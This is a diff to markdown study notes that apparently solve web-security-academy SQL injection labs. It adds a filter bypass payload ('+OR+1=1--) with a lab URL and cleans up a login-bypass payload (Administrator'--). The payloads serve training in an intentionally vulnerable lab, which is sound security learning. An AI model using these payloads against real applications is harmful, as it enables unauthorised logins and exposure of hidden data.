@@ -21,14 +21,14 @@ Alternatively and automaticly use the Burp Scanner to find the majority of SQL i
 ```
 
 ## Lab: SQL injection vulnerability allowing login bypass
-This lab contains a SQL injection vulnerability in the login function.\
-To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.\
+This lab contains a SQL injection vulnerability in the login function.
+To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.
 
 ### Solution
 ```
-Username\
-|------------------| > Administrator'--\
-Password\
+Username
+|------------------| > Administrator'--
+Password
 |------------------| (anything) gets commented out
 ```
 
@@ -40,6 +40,10 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
 
 ### Solution
+'+OR+1=1--
+```
+https://0a57002303b161df81053ec000a1006c.web-security-academy.net/filter?category=Lifestyle%27+OR+1=1--
+```
 
 </details>
 
